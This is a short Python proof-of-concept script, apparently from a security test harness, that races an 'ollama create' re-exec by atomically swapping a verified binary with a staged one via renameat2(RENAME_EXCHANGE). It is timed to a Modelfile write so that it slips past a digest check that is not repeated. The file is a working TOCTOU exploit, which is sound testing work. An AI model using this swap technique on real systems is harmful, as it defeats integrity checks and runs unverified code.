#!/usr/bin/env python3
"""A02BinarySwapRace stage-2 racer: same renameat2(RENAME_EXCHANGE) primitive,
but triggered by the tool writing the Modelfile — the last action before it
re-execs the SAME binary path for the `ollama create` subprocess, an exec that
happens after running-exe-digest has already passed and is never re-verified.

usage: exchange2.py WATCHFILE TARGET STAGE TLOG TIMEOUT
"""
import ctypes
import os
import sys
import time

AT_FDCWD = -100
RENAME_EXCHANGE = 2
SYS_renameat2 = 316


def renameat2_exchange(a, b):
    libc = ctypes.CDLL(None, use_errno=True)
    if hasattr(libc, 'renameat2'):
        libc.renameat2.argtypes = [ctypes.c_int, ctypes.c_char_p, ctypes.c_int,
                                   ctypes.c_char_p, ctypes.c_uint]
        rc = libc.renameat2(AT_FDCWD, a.encode(), AT_FDCWD, b.encode(), RENAME_EXCHANGE)
    else:
        libc.syscall.restype = ctypes.c_long
        rc = libc.syscall(SYS_renameat2, AT_FDCWD, a.encode(), AT_FDCWD,
                          b.encode(), RENAME_EXCHANGE)
    if rc != 0:
        err = ctypes.get_errno()
        raise OSError(err, os.strerror(err))


def main():
    watch, target, stage, tlog = sys.argv[1:5]
    timeout = float(sys.argv[5]) if len(sys.argv) > 5 else 120.0
    t0 = time.monotonic()
    while not os.path.exists(watch):
        if time.monotonic() - t0 > timeout:
            print('EXCHANGER2 watch-timeout')
            sys.exit(4)
    fire_ns = time.monotonic_ns()
    renameat2_exchange(target, stage)
    done_ns = time.monotonic_ns()
    line = f'EXCHANGED2 watch={watch} fire_ns={fire_ns} done_ns={done_ns}'
    with open(tlog, 'a') as f:
        f.write(line + '\n')
    print('EXCHANGER2', line)


main()
